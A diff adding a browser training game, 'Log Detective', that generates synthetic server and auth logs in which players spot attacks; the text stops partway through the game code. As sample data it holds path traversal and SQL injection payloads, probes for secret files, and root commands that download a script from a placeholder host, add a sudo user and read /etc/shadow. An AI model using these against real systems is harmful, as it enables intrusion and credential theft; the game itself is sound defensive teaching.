@@ -1,0 +1,540 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="robots" content="noindex, nofollow">
+<title>Log Detective</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="arcade.css">
+<style>
+  /* Layout: wide cabinet, HUD, then a case panel (meta row, timer bar, question, scrolling log, feedback). */
+  :root { --accent: #b4c7ff; }
+  .cab { max-width: 860px; }
+  h1 { color: var(--accent); }
+  .panel { display: flex; flex-direction: column; gap: 12px; min-height: 480px; }
+  .meta { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.12em; color: var(--muted); }
+  #file { text-transform: none; letter-spacing: 0; color: var(--accent); }
+  .bar { height: 6px; border-radius: 3px; background: var(--ground); overflow: hidden; }
+  .bar i { display: block; height: 100%; width: 100%; background: var(--accent); transform-origin: left; }
+  .bar i.low { background: var(--danger); }
+  #q { margin: 0; font-size: 1rem; line-height: 1.45; font-weight: 600; }
+  #log {
+    background: var(--ground); border-radius: 4px; box-shadow: inset 0 0 0 1px var(--grid);
+    max-height: 52vh; min-height: 220px; overflow-y: auto; padding: 6px 0;
+    font-size: 0.72rem; line-height: 1.45;
+  }
+  #log:focus-visible { outline: 3px solid var(--accent); outline-offset: 2px; }
+  .ln { display: grid; grid-template-columns: 3.2ch 1fr; gap: 10px; padding: 1px 10px; cursor: pointer; border-left: 3px solid transparent; }
+  .ln .n { color: var(--muted); text-align: right; user-select: none; }
+  .ln .t { white-space: pre-wrap; overflow-wrap: anywhere; }
+  .ln.sel { background: color-mix(in srgb, var(--accent) 22%, var(--ground)); border-left-color: var(--accent); outline: 2px solid var(--accent); outline-offset: -2px; }
+  .ln.right { background: color-mix(in srgb, var(--good) 22%, var(--ground)); border-left-color: var(--good); }
+  .ln.wrong { background: color-mix(in srgb, var(--danger) 25%, var(--ground)); border-left-color: var(--danger); }
+  .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+  #fb { margin: 0; min-height: 1.5em; font-size: 0.85rem; line-height: 1.5; color: var(--muted); flex: 1 1 260px; }
+  #fb.right { color: var(--good); }
+  #fb.wrong { color: var(--danger); }
+  #fb .ex { color: var(--ink); }
+  #lives { color: var(--danger); letter-spacing: 0.1em; }
+  @media (prefers-reduced-motion: reduce) { #log { scroll-behavior: auto; } }
+</style>
+
+<div class="cab">
+  <h1>Log Detective</h1>
+  <p class="rule">Read each server log and flag a line that answers the question before 45 seconds run out. Faster correct answers earn more points, and three wrong answers end the game.</p>
+
+  <div class="hud">
+    <div class="stat"><span class="k">Score</span><span class="v" id="score">0</span></div>
+    <div class="stat"><span class="k">Best</span><span class="v" id="best">0</span></div>
+    <div class="stat"><span class="k">Lives</span><span class="v" id="lives" aria-label="3 lives">♥♥♥</span></div>
+  </div>
+
+  <div class="panel">
+    <div class="meta"><span id="num">Case 1</span><span id="file"></span><span id="left"></span></div>
+    <div class="bar" aria-hidden="true"><i id="bar"></i></div>
+    <p id="q">Your first case will appear here.</p>
+    <div id="log" tabindex="0" role="listbox" aria-label="Log lines"></div>
+    <div class="row">
+      <p id="fb" aria-live="polite"></p>
+      <button id="flag" type="button">Flag this line</button>
+    </div>
+
+    <div class="overlay" id="ov">
+      <h2 id="ovt">Ready to play?</h2>
+      <p id="ovp">Move through the log with the arrow keys and press Enter to flag the line you think answers the question.</p>
+      <button id="go" type="button">Start game</button>
+    </div>
+  </div>
+
+  <p class="keys">Move the line cursor with <kbd>↑</kbd> and <kbd>↓</kbd>, jump ten lines with <kbd>PageUp</kbd> and <kbd>PageDown</kbd>, or go to the top or bottom with <kbd>Home</kbd> and <kbd>End</kbd>. Press <kbd>Enter</kbd> to flag the selected line, and press it again to go on to the next case. Press <kbd>Esc</kbd> (or <kbd>Alt+Shift+H</kbd>) to go back to all games.</p>
+  <a class="back" href="index.html">← Back to all games</a>
+</div>
+
+<script src="arcade.js"></script>
+<script>
+(() => {
+  // GEN START
+  // Builds one randomized case: { kind, file, question, explain, lines: [string], answers: [index] }.
+  const MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+  const pad2 = n => String(n).padStart(2, '0');
+  const BROWSERS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+  ];
+  const BOTS = [
+    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  ];
+  const TRAV = [
+    '/download.php?file=../../../../etc/passwd',
+    '/index.php?page=../../../etc/passwd',
+    '/view?doc=..%2F..%2F..%2F..%2Fetc%2Fpasswd',
+    '/static/..%2f..%2f..%2f..%2fetc/passwd',
+    '/download.php?file=....//....//....//etc/passwd',
+    '/files?name=../../../../etc/shadow',
+    '/index.php?page=../../../../proc/self/environ',
+  ];
+  const SQLI = [
+    '/products.php?id=1%27%20OR%20%271%27%3D%271',
+    '/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--',
+    '/products.php?id=1%27%20AND%20SLEEP(5)--%20-',
+    '/search?q=%27%3B%20DROP%20TABLE%20users--',
+    '/products.php?id=5%20AND%201%3D1',
+    '/products.php?id=5%20AND%201%3D2',
+    '/products.php?id=-1+UNION+SELECT+1,2,3--',
+    '/login.php?user=admin%27--',
+  ];
+  const PROBES = ['/.env', '/.git/config', '/wp-admin/', '/wp-login.php', '/phpmyadmin/', '/admin.php', '/backup.zip', '/config.json',
+    '/.aws/credentials', '/db.sql', '/old/', '/test.php', '/.DS_Store', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', '/actuator/health', '/shell.php'];
+  const ADMINS = ['alice', 'ops', 'rkumar', 'lchen'];
+  const REGULARS = ['bob', 'mjones', 'intern', 'tsato'];
+  const SUDO_OK = ['/usr/bin/systemctl restart nginx', '/usr/bin/apt update', '/usr/bin/apt upgrade -y', '/usr/bin/journalctl -u nginx --since today',
+    '/usr/bin/tail -n 50 /var/log/syslog', '/usr/sbin/ufw status', '/usr/bin/docker ps', '/usr/bin/systemctl status postgresql'];
+  const NIGHT_CMDS = ['/usr/sbin/useradd -m -s /bin/bash -G sudo support', '/usr/bin/bash', '/usr/bin/cat /etc/shadow',
+    '/usr/bin/crontab -e', '/usr/bin/curl -o /tmp/.x http://198.51.100.23/x.sh'];
+  const BRUTE_USERS = ['root', 'admin', 'test', 'oracle', 'ubuntu', 'postgres', 'user', 'pi', 'git', 'ftp'];
+  const VALID = new Set(['root', 'deploy']);
+
+  const KINDS = ['traversal', 'sqli', 'scanner', 'spray', 'burst', 'weblogin', 'sshbrute', 'sshsuccess', 'nosudo', 'nightsudo', 'sufail'];
+
+  function makeCase(rand, kind) {
+    const ri = (a, b) => a + Math.floor(rand() * (b - a + 1));
+    const pick = a => a[Math.floor(rand() * a.length)];
+    const chance = p => rand() < p;
+    const shuffle = a => { a = [...a]; for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(rand() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; };
+    const used = new Set();
+    const uniq = f => { for (;;) { const v = f(); if (!used.has(v)) { used.add(v); return v; } } };
+    const docIP = () => uniq(() => `${pick(['192.0.2', '198.51.100', '203.0.113'])}.${ri(2, 254)}`);
+    const privIP = () => uniq(() => pick([
+      () => `10.${ri(0, 40)}.${ri(0, 255)}.${ri(2, 254)}`,
+      () => `192.168.${ri(0, 20)}.${ri(2, 254)}`,
+      () => `172.${ri(16, 31)}.${ri(0, 255)}.${ri(2, 254)}`])());
+    const anyIP = () => chance(0.55) ? docIP() : privIP();
+    const port = () => ri(32768, 60999);
+    const pid = () => uniq(() => ri(1200, 98000));
+    const day0 = Date.UTC(2026, ri(0, 9), ri(1, 27), 0, 0, 0);
+    const ev = [];
+    const webOff = ri(8, 20) * 3600;
+    const accTime = t => { const d = new Date(day0 + (t + webOff) * 1000); return `${pad2(d.getUTCDate())}/${MONTHS[d.getUTCMonth()]}/${d.getUTCFullYear()}:${pad2(d.getUTCHours())}:${pad2(d.getUTCMinutes())}:${pad2(d.getUTCSeconds())} +0000`; };
+    const authTime = t => { const d = new Date(day0 + t * 1000); return `${MONTHS[d.getUTCMonth()]} ${String(d.getUTCDate()).padStart(2, ' ')} ${pad2(d.getUTCHours())}:${pad2(d.getUTCMinutes())}:${pad2(d.getUTCSeconds())}`; };
+    let target = ri(36, 64);
+
+    // ---------- web access log ----------
+    const SITE = 'https://www.example.com';
+    const acc = (t, ip, method, path, status, size, ref, ua, ans = false) =>
+      ev.push({ t, ans, s: () => `${ip} - - [${accTime(t)}] "${method} ${path} HTTP/1.1" ${status} ${size} "${ref}" "${ua}"` });
+    const pageList = () => pick(['/', '/products', `/products/${ri(1000, 1999)}`, '/cart', '/about', '/contact',
+      `/search?q=${pick(['blue+shoes', 'rain+jacket', 'gift+card', 'wool+socks'])}`, `/blog/2026/09/${pick(['fall-sale', 'new-arrivals', 'care-guide'])}`,
+      `/products.php?id=${ri(1, 300)}`, `/api/v1/items?page=${ri(1, 5)}`]);
+    function browse(ip, t, opt = {}) {
+      const ua = opt.ua || pick(BROWSERS);
+      let ref = chance(0.5) ? '-' : pick(['https://www.google.com/', 'https://duckduckgo.com/', `${SITE}/`]);
+      let did404 = !opt.allow404;
+      const pages = ri(1, 3);
+      for (let i = 0; i < pages; i++) {
+        const p = pageList();
+        acc(t, ip, 'GET', p, 200, ri(2100, 38000), ref, ua);
+        const assets = chance(0.5) ? shuffle(['/static/css/main.css', '/static/js/app.js', '/images/logo.png']).slice(0, ri(1, 2)) : [];
+        for (const a of assets) { const cached = chance(0.4); acc(t + ri(0, 1), ip, 'GET', a, cached ? 304 : 200, cached ? 0 : ri(1800, 90000), SITE + p, ua); }
+        if (!did404 && chance(0.25)) { did404 = true; acc(t + 1, ip, 'GET', pick(['/apple-touch-icon.png', '/favicon.ico', '/blog/2019/old-post']), 404, ri(150, 560), SITE + p, ua); }
+        ref = SITE + p;
+        t += ri(6, 90);
+      }
+    }
+    function bot(ip, t) {
+      const ua = pick(BOTS);
+      acc(t, ip, 'GET', '/robots.txt', 200, ri(60, 240), '-', ua);
+      acc(t + ri(2, 40), ip, 'GET', pageList(), 200, ri(2100, 38000), '-', ua);
+    }
+    function webNoise(W, opt = {}) {
+      while (ev.length < target) {
+        const t = ri(0, W);
+        if (opt.ok && !opt.ok(t)) continue;
+        if (chance(0.12)) bot(docIP(), t); else browse(anyIP(), t, opt);
+      }
+    }
+
+    // ---------- auth.log ----------
+    const host = pick(['web01', 'db02', 'bastion', 'app03']);
+    const au = (t, prog, msg, ans = false) => ev.push({ t, ans, s: () => `${authTime(t)} ${host} ${prog}: ${typeof msg === 'function' ? msg() : msg}` });
+    const uids = {}; let nextUid = 1001;
+    const uid = u => u === 'root' ? 0 : (uids[u] ??= nextUid++);
+    let sessNo = ri(3, 400), tty = 0;
+    function sudo(t, user, cmd, ans = false, ttyName = 'pts/0') {
+      au(t, 'sudo', `${user.padStart(8)} : TTY=${ttyName} ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`, ans);
+      au(t, 'sudo', `pam_unix(sudo:session): session opened for user root(uid=0) by ${user}(uid=${uid(user)})`);
+      au(t + ri(0, 4), 'sudo', 'pam_unix(sudo:session): session closed for user root');
+    }
+    // A full SSH session; `inside(t, tty)` may add lines while logged in. Returns the login time.
+    function ssh(user, ip, t, opt = {}) {
+      const p = pid(), pt = port(), sshd = `sshd[${p}]`, sk = {}, n = () => sk.n ??= sessNo++, ttyName = `pts/${tty++ % 4}`;
+      const method = opt.method || (opt.typo ? 'password' : chance(0.75) ? 'publickey' : 'password');
+      if (opt.typo) au(t - ri(3, 9), sshd, `Failed password for ${user} from ${ip} port ${pt} ssh2`);
+      au(t, sshd, method === 'publickey'
+        ? `Accepted publickey for ${user} from ${ip} port ${pt} ssh2: ED25519 SHA256:${key()}`
+        : `Accepted password for ${user} from ${ip} port ${pt} ssh2`, !!opt.ans);
+      au(t, sshd, `pam_unix(sshd:session): session opened for user ${user}(uid=${uid(user)}) by (uid=0)`);
+      au(t, 'systemd-logind[611]', () => `New session ${n()} of user ${user}.`);
+      let end = t + ri(120, 2400);
+      if (opt.inside) end = Math.max(end, opt.inside(t, ttyName) + ri(30, 600));
+      if (!opt.open) {
+        au(end, sshd, `Received disconnect from ${ip} port ${pt}:11: disconnected by user`);
+        au(end, sshd, `Disconnected from user ${user} ${ip} port ${pt}`);
+        au(end, sshd, `pam_unix(sshd:session): session closed for user ${user}`);
+        au(end, 'systemd-logind[611]', () => `Session ${n()} logged out. Waiting for processes to exit.`);
+      }
+      return t;
+    }
+    const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+    const key = () => Array.from({ length: 43 }, () => pick([...B64])).join('');
+    function cron(t) {
+      const c = `CRON[${pid()}]`;
+      au(t, c, 'pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)');
+      au(t + ri(0, 1), c, 'pam_unix(cron:session): session closed for user root');
+    }
+    const admins = shuffle(ADMINS).slice(0, 2);
+    // Daytime noise between t0 and t1 (seconds). Admin sessions may run harmless sudo commands.
+    function authNoise(t0, t1, opt = {}) {
+      while (ev.length < target) {
+        const t = ri(t0, t1);
+        const r = rand();
+        if (r < 0.22) cron(t);
+        else {
+          const admin = chance(0.6);
+          const user = admin ? pick(admins) : pick(['deploy', ...REGULARS.filter(u => u !== opt.skipUser)]);
+          const ip = chance(0.7) ? privIP() : docIP();
+          ssh(user, ip, t, {
+            typo: chance(0.12),
+            inside: admin && opt.sudo !== false ? ((ts, ty) => { let x = ts + ri(20, 200); sudo(x, user, pick(SUDO_OK), false, ty); return x; }) : null,
+          });
+        }
+      }
+    }
+    // Trims open-ended events (disconnects) that fall outside the window, so the log reads as one slice.
+    const clip = (t0, t1) => { for (let i = ev.length - 1; i >= 0; i--) if (ev[i].t < t0 || ev[i].t > t1) ev.splice(i, 1); };
+    // Adds noise, trims to the window, and tops up until the log has at least 32 lines.
+    function fill(noise, t0, t1) {
+      for (;;) { noise(); clip(t0, t1); if (ev.length >= 32) return; target = ev.length + 4; }
+    }
+
+    let c;
+    const hour = h => h * 3600;
+    if (kind === 'traversal') {
+      const W = ri(900, 1800), ta = ri(W * 0.25, W * 0.6), ip = docIP(), ua = pick([...BROWSERS, 'curl/8.5.0', 'python-requests/2.31.0']);
+      const tries = shuffle(TRAV).slice(0, ri(4, 6));
+      const v200 = chance(0.5), win = v200 ? ri(1, tries.length - 1) : -1;
+      let t = ta;
+      tries.forEach((p, i) => {
+        const ok = i === win;
+        acc(t, ip, 'GET', p, ok ? 200 : pick([400, 403, 404]), ok ? ri(1600, 2900) : ri(150, 560), '-', ua, v200 ? ok : true);
+        t += ri(1, 6);
+      });
+      if (!v200 && chance(0.6)) browse(ip, ta - ri(60, 200), { ua });
+      webNoise(W);
+      c = { log: 'access', question: v200
+        ? 'An attacker tried several path traversal requests, and one of them worked. Find the traversal request that returned status 200.'
+        : 'Someone is trying to read system files by climbing out of the web folder (a path traversal attack). Find one of those requests.',
+        explain: `The address ${ip} requested paths containing ../ sequences (sometimes encoded as ..%2F), which try to climb out of the web folder to reach files such as /etc/passwd.` +
+          (v200 ? ' Only one of those requests came back with status 200 and a response the size of a real passwd file, so the server actually handed the file over.' : '') };
+    } else if (kind === 'sqli') {
+      const W = ri(900, 1800), ta = ri(W * 0.25, W * 0.6), ip = docIP(), ua = pick(BROWSERS);
+      let t = ta;
+      if (chance(0.6)) { acc(t, ip, 'GET', `/products.php?id=${ri(1, 40)}`, 200, ri(4000, 9000), '-', ua); t += ri(3, 20); }
+      for (const p of shuffle(SQLI).slice(0, ri(3, 5))) { acc(t, ip, 'GET', p, pick([200, 200, 500]), ri(300, 9000), '-', ua, true); t += ri(2, 15); }
+      webNoise(W);
+      c = { log: 'access', question: 'Someone is trying SQL injection, slipping database commands into the query string. Find one of those requests.',
+        explain: `The requests from ${ip} put SQL into a parameter. %27 is an encoded single quote, and payloads such as OR '1'='1', UNION SELECT, and SLEEP(5) are classic ways to make the database run the attacker’s code.` };
+    } else if (kind === 'scanner') {
+      const W = ri(900, 1800), ta = ri(W * 0.25, W * 0.6), ip = docIP();
+      const tool = pick(['Nikto', 'sqlmap', 'WPScan']);
+      const ua = () => tool === 'Nikto' ? `Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:${String(ri(100, 7999)).padStart(6, '0')})`
+        : tool === 'sqlmap' ? 'sqlmap/1.8.4#stable (https://sqlmap.org)' : 'WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)';
+      const paths = tool === 'Nikto' ? ['/', '/admin/', '/phpinfo.php', '/.htaccess', '/cgi-bin/test.cgi', '/backup/', '/config.php.bak', '/server-status', '/icons/README']
+        : tool === 'sqlmap' ? ['/products.php?id=1', `/products.php?id=1%20AND%20${ri(1000, 9999)}%3D${ri(1000, 9999)}`, '/products.php?id=1%29%20AND%201%3D1--', `/products.php?id=1%27%20AND%20${ri(1000, 9999)}%3D${ri(1000, 9999)}--%20`, '/products.php?id=1%20ORDER%20BY%201--', '/products.php?id=1%20UNION%20ALL%20SELECT%20NULL--', '/products.php?id=1%3BSELECT%20PG_SLEEP(5)--']
+        : ['/wp-login.php', '/wp-json/wp/v2/users', '/readme.html', '/wp-content/plugins/', '/xmlrpc.php', '/wp-includes/js/jquery/jquery.js', '/wp-content/debug.log', '/wp-cron.php'];
+      let t = ta;
+      for (const p of shuffle(paths).slice(0, ri(6, Math.min(9, paths.length)))) { acc(t, ip, 'GET', p, pick([200, 404, 404, 403]), ri(150, 9000), '-', ua(), true); t += ri(0, 2); }
+      webNoise(W);
+      c = { log: 'access', question: 'An automated vulnerability scanner is crawling this site and names itself in its user agent. Find one of its requests.',
+        explain: `The requests from ${ip} carry the user agent of ${tool}, an automated security scanner. Real browsers never send that string, while Googlebot and bingbot are ordinary search crawlers.` };
+    } else if (kind === 'spray') {
+      const W = ri(900, 1800), ta = ri(W * 0.25, W * 0.6), ip = docIP(), ua = pick([...BROWSERS, 'python-requests/2.31.0']);
+      const probes = shuffle(PROBES).slice(0, ri(9, 13));
+      let t = ta;
+      for (const p of probes) { acc(t, ip, 'GET', p, 404, ri(150, 560), '-', ua, true); t += ri(1, 3); }
+      webNoise(W, { allow404: true });
+      c = { log: 'access', question: 'One IP address is probing for files that don’t exist and collecting a pile of 404 errors. Find one of its requests.',
+        explain: `${ip} asked for ${probes.length} different files that do not exist, such as ${probes[0]} and ${probes[1]}, and got a 404 every time. That pattern is a scanner looking for leaked secrets and forgotten admin pages.` };
+    } else if (kind === 'burst') {
+      const W = ri(900, 1800), ta = ri(W * 0.25, W * 0.6), ip = docIP(), ua = pick([...BROWSERS, 'python-requests/2.31.0', 'Go-http-client/1.1']);
+      const n = ri(14, 20), api = chance(0.5), base = ri(1000, 1900), limited = chance(0.5) ? ri(2, 4) : 0;
+      for (let i = 0; i < n; i++) {
+        const rl = i >= n - limited;
+        acc(ta + Math.floor(i * 3 / n), ip, 'GET', api ? `/api/v1/items?page=${i + 1}` : `/products/${base + i}`, rl ? 429 : 200, rl ? ri(160, 220) : ri(2100, 30000), '-', ua, true);
+      }
+      webNoise(W);
+      c = { log: 'access', question: 'One address suddenly sent a burst of requests within a couple of seconds. Find one of them.',
+        explain: `${ip} sent ${n} requests in about three seconds, stepping through ${api ? 'API pages' : 'product pages'} one after another. No person clicks that fast, so this is an automated scraper or a flood.` + (limited ? ' The final 429 responses mean the server started rate-limiting it.' : '') };
+    } else if (kind === 'weblogin') {
+      const W = 2400, ta = ri(W * 0.3, W * 0.55), ip = docIP(), ua = pick([...BROWSERS, 'python-requests/2.31.0']);
+      const nf = ri(8, 13);
+      let t = ta;
+      for (let i = 0; i < nf; i++) { acc(t, ip, 'POST', '/login', 401, ri(1800, 1900), '-', ua); t += ri(2, 6); }
+      const win = t;
+      acc(t, ip, 'POST', '/login', 302, 0, '-', ua, true);
+      acc(t + 1, ip, 'GET', '/account', 200, ri(5000, 9000), '-', ua);
+      if (chance(0.5)) acc(t + ri(5, 30), ip, 'GET', '/account/settings', 200, ri(5000, 9000), `${SITE}/account`, ua);
+      const ok = x => x < ta - 120 || x > win + 60;
+      for (let k = ri(2, 3); k > 0; k--) {
+        let x; do x = ri(0, W); while (!ok(x) || !ok(x + 30));
+        const lip = anyIP(), lua = pick(BROWSERS);
+        acc(x, lip, 'GET', '/login', 200, ri(3000, 3200), `${SITE}/`, lua);
+        let y = x + ri(8, 15);
+        if (chance(0.35)) { acc(y, lip, 'POST', '/login', 401, ri(1800, 1900), `${SITE}/login`, lua); y += ri(5, 10); }
+        acc(y, lip, 'POST', '/login', 302, 0, `${SITE}/login`, lua);
+        acc(y + 1, lip, 'GET', '/account', 200, ri(5000, 9000), `${SITE}/login`, lua);
+      }
+      webNoise(W, { ok: x => ok(x) && ok(x + 300) });
+      c = { log: 'access', question: 'Someone guessed passwords on the login form until one worked. This site answers a correct password with a 302 redirect. Find the first successful login after the attack began.',
+        explain: `${ip} posted to /login ${nf} times and got 401 Unauthorized each time, then received a 302 redirect, which means the password finally worked.` };
+    } else if (kind === 'sshbrute' || kind === 'sshsuccess') {
+      const W = hour(ri(2, 4)), start = hour(ri(8, 15)), ta = start + ri(W * 0.25, W * 0.55), ip = docIP();
+      const success = kind === 'sshsuccess', n = ri(6, 9);
+      const tried = new Set();
+      let t = ta, first = -1;
+      for (let i = 0; i < n; i++) {
+        const u = success && (i >= n - 3 || chance(0.3)) ? 'deploy' : pick(BRUTE_USERS);
+        tried.add(u);
+        const p = `sshd[${pid()}]`, pt = port(), A = !success;
+        if (!VALID.has(u)) {
+          au(t, p, `Invalid user ${u} from ${ip} port ${pt}`, A);
+          au(t + ri(1, 3), p, `Failed password for invalid user ${u} from ${ip} port ${pt} ssh2`, A);
+          if (chance(0.5)) au(t + ri(3, 4), p, `Connection closed by invalid user ${u} ${ip} port ${pt} [preauth]`, A);
+        } else {
+          if (chance(0.4)) au(t + 1, p, `pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=${ip}  user=${u}`, A);
+          au(t + ri(2, 3), p, `Failed password for ${u} from ${ip} port ${pt} ssh2`, A);
+          if (chance(0.5)) au(t + ri(4, 5), p, `Connection closed by authenticating user ${u} ${ip} port ${pt} [preauth]`, A);
+        }
+        t += ri(6, 25);
+      }
+      if (success) {
+        ssh('deploy', ip, t, { method: 'password', ans: true, open: true });
+        if (chance(0.4)) ssh('deploy', ip, t + ri(600, 1800), { method: 'password', open: true });
+      }
+      fill(() => authNoise(start, start + W), start, start + W);
+      const users = [...tried].slice(0, 3).join(', ');
+      c = { log: 'auth', question: success
+        ? 'An SSH password-guessing attack eventually got in. Find the first successful login from the attacking address.'
+        : 'One IP address is trying to guess passwords over SSH. Find one of its log lines.',
+        explain: success
+          ? `After ${n} failed attempts, ${ip} logged in as deploy with a password. That “Accepted password” line is the moment the attacker got in.`
+          : `${ip} failed to log in ${n} times within a few minutes, trying usernames such as ${users}. That is a password-guessing (brute-force) attack, while the other logins come from known users with a key or a single typo.` };
+    } else if (kind === 'nosudo') {
+      const W = hour(ri(3, 6)), start = hour(ri(8, 11)), user = pick(REGULARS), cmd = pick(['/usr/bin/cat /etc/shadow', '/usr/bin/su -', '/usr/bin/bash', '/usr/sbin/visudo', '/usr/bin/passwd root']);
+      const t = start + ri(W * 0.3, W * 0.6);
+      ssh(user, privIP(), t, { inside: (ts, ty) => { const x = ts + ri(40, 300); au(x, 'sudo', `${user.padStart(8)} : user NOT in sudoers ; TTY=${ty} ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`, true); return x; } });
+      fill(() => authNoise(start, start + W, { skipUser: user }), start, start + W);
+      c = { log: 'auth', question: 'A user who isn’t allowed to use sudo tried to run a command as root. Find that line.',
+        explain: `${user} is not in the sudoers file, so sudo refused to run ${cmd} and logged “user NOT in sudoers”. Repeated attempts like this are worth a conversation with the user.` };
+    } else if (kind === 'nightsudo') {
+      const start = hour(ri(13, 15)), end = hour(24 + ri(9, 10)), user = pick(['deploy', ...REGULARS]), ip = docIP(), cmd = pick(NIGHT_CMDS);
+      const tLogin = hour(27) + 60 * ri(2, 9) + ri(0, 59);
+      ssh(user, ip, tLogin, { method: 'password', inside: (ts, ty) => { const x = hour(27) + 12 * 60 + ri(0, 59); sudo(x, user, cmd, true, ty); return x; } });
+      for (let h = Math.ceil(start / 3600) + 1; h * 3600 < end; h += ri(2, 3)) cron(h * 3600 + 17 * 60);
+      // Daytime work only: afternoon of day one and morning of day two.
+      const day = () => chance(0.5) ? ri(start, hour(18)) : ri(hour(32) + 1800, end);
+      fill(() => { while (ev.length < target) {
+        const t = day(), admin = pick(admins);
+        ssh(admin, privIP(), t, { inside: (ts, ty) => { const x = Math.min(ts + ri(20, 200), Math.floor(ts / 3600) * 3600 + 3500); sudo(x, admin, pick(SUDO_OK), false, ty); return x; } });
+      } }, start, end);
+      c = { log: 'auth', question: 'This team only does admin work during business hours. Find the sudo command someone ran in the middle of the night.',
+        explain: `${user} logged in with a password from ${ip} after 3 a.m. and ran ${cmd} as root at 03:12, hours after anyone else did admin work. A night-time root command on a quiet server is a strong sign of a stolen account.` };
+    } else {
+      const W = hour(ri(3, 5)), start = hour(ri(8, 12)), user = pick(REGULARS), su = admins[0];
+      const t = start + ri(W * 0.3, W * 0.6), tries = ri(3, 4);
+      ssh(user, privIP(), t, { inside: (ts, ty) => {
+        let x = ts + ri(40, 200);
+        for (let i = 0; i < tries; i++) {
+          const p = `su[${pid()}]`;
+          au(x, p, `pam_unix(su:auth): authentication failure; logname=${user} uid=${uid(user)} euid=0 tty=/dev/${ty} ruser=${user} rhost=  user=root`, true);
+          au(x + 2, p, `FAILED SU (to root) ${user} on ${ty}`, true);
+          x += ri(6, 20);
+        }
+        return x;
+      } });
+      ssh(su, privIP(), start + ri(60, W * 0.25), { inside: (ts, ty) => {
+        const x = ts + ri(30, 200), p = `su[${pid()}]`;
+        au(x, p, `(to root) ${su} on ${ty}`);
+        au(x, p, `pam_unix(su:session): session opened for user root(uid=0) by ${su}(uid=${uid(su)})`);
+        au(x + ri(60, 600), p, 'pam_unix(su:session): session closed for user root');
+        return x;
+      } });
+      fill(() => authNoise(start, start + W, { skipUser: user }), start, start + W);
+      c = { log: 'auth', question: 'Someone kept typing the wrong root password into su. Find one of the failed attempts.',
+        explain: `Each “FAILED SU (to root)” line, along with the matching pam_unix authentication failure, is ${user} entering the wrong root password. The successful “(to root)” line belongs to ${su}, an admin.` };
+    }
+    ev.sort((a, b) => a.t - b.t);
+    const lines = ev.map(e => e.s());
+    const answers = ev.map((e, i) => e.ans ? i : -1).filter(i => i >= 0);
+    const file = c.log === 'auth' ? '/var/log/auth.log' : pick(['/var/log/nginx/access.log', '/var/log/apache2/access.log']);
+    return { kind, file, question: c.question, explain: c.explain, lines, answers };
+  }
+  // GEN END
+
+  const $ = id => document.getElementById(id);
+  const KEY = 'logDetectiveBest', TIME = 45000, LIVES = 3;
+  let best = Arcade.best(KEY);
+  const s = { state: 'ready', score: 0, lives: LIVES, n: 0, kinds: [], cur: null, sel: 0, t0: 0, timer: 0 };
+  $('best').textContent = best.toLocaleString('en-US');
+  const log = $('log');
+
+  function showOverlay(t, p, b) { $('ovt').textContent = t; $('ovp').textContent = p; $('go').textContent = b; $('ov').hidden = false; $('go').focus(); }
+
+  function hud() {
+    $('score').textContent = s.score.toLocaleString('en-US');
+    $('lives').textContent = '♥'.repeat(s.lives) + '♡'.repeat(LIVES - s.lives);
+    $('lives').setAttribute('aria-label', `${s.lives} ${s.lives === 1 ? 'life' : 'lives'}`);
+  }
+
+  function start() {
+    Object.assign(s, { score: 0, lives: LIVES, n: 0, kinds: [] });
+    $('ov').hidden = true;
+    hud();
+    next();
+  }
+
+  function next() {
+    if (!s.kinds.length) s.kinds = Arcade.shuffle(KINDS);
+    s.cur = makeCase(Math.random, s.kinds.pop());
+    s.n++;
+    $('num').textContent = `Case ${s.n}`;
+    $('file').textContent = s.cur.file;
+    $('q').textContent = s.cur.question;
+    $('fb').textContent = ''; $('fb').className = '';
+    log.innerHTML = '';
+    s.cur.lines.forEach((text, i) => {
+      const d = document.createElement('div');
+      d.className = 'ln'; d.id = `ln-${i}`; d.setAttribute('role', 'option');
+      d.innerHTML = '<span class="n"></span><span class="t"></span>';
+      d.firstChild.textContent = i + 1;
+      d.lastChild.textContent = text;
+      d.addEventListener('click', () => { select(i); log.focus(); });
+      d.addEventListener('dblclick', () => flag());
+      log.append(d);
+    });
+    log.scrollTop = 0;
+    s.sel = 0; select(0);
+    s.state = 'play';
+    $('flag').textContent = 'Flag this line';
+    s.t0 = performance.now();
+    log.focus();
+    tick();
+  }
+
+  function select(i) {
+    const rows = log.children;
